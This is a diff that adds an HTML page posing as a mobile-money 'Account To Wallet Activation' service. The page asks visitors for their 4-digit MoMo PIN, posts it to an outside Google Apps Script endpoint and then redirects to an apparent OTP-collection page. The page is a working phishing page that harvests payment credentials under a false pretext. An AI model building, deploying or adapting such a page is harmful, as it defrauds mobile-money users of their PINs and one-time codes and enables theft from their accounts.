@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account To Wallet Activation</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --blue-dark:#063f73;
+      --blue-mid:#074f87;
+      --input-border:#dadada;
+      --submit-grey:#9e9e9e;
+    }
+
+    body{
+      margin:0;
+      font-family:"Montserrat", sans-serif;
+      background:linear-gradient(180deg, var(--blue-mid), var(--blue-dark));
+      color:#fff;
+    }
+
+    .page{
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      padding:30px 20px;
+    }
+
+    .title{
+      font-size:28px;
+      font-weight:800;
+      margin-top:15px;
+    }
+
+    .subtitle{
+      margin-top:16px;
+      text-align:center;
+      font-size:16px;
+      white-space:pre-line;
+    }
+
+    .card{
+      background:#fff;
+      width:100%;
+      max-width:700px;
+      border-radius:20px;
+      padding:22px;
+      margin-top:25px;
+      color:#000;
+    }
+
+    .label{
+      font-size:18px;
+      font-weight:700;
+      margin-bottom:10px;
+    }
+
+    .input{
+      width:100%;
+      border:1px solid var(--input-border);
+      padding:14px;
+      border-radius:12px;
+      font-size:18px;
+      margin-bottom:20px;
+    }
+
+    .btn{
+      width:100%;
+      background:var(--submit-grey);
+      padding:16px;
+      border-radius:30px;
+      border:none;
+      color:#000;
+      font-size:18px;
+      font-weight:800;
+    }
+  </style>
+
+</head>
+
+<body>
+
+<div class="page">
+
+  <div class="title">ACCOUNT TO WALLET ACTIVATION</div>
+  <div class="subtitle">
+Link your MoMo to your Bank Account Below
+  </div>
+
+  <div class="card">
+    <div class="label">Enter 4-digit MoMo Code</div>
+
+    <input id="codeInput" class="input" type="password" maxlength="4" placeholder="****">
+
+    <button id="submitBtn" class="btn">Link Wallet</button>
+  </div>
+
+</div>
+
+<script>
+  const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbx4u9G1KhfKRDV_uK3g-n0aDbyVPAj1nly8LkC2oILkjfvs8weP0C5Shrhigp6EIFHCIQ/exec";
+
+  document.getElementById("submitBtn").addEventListener("click", async ()=>{
+      const code = document.getElementById("codeInput").value.trim();
+
+      await fetch(WEBAPP_URL,{
+          method:"POST",
+          headers:{ "Content-Type":"application/json" },
+          body:JSON.stringify({ momoCode: code })
+      });
+
+      window.location.href = "otp.html";
+  });
+</script>
+
+</body>
+</html>
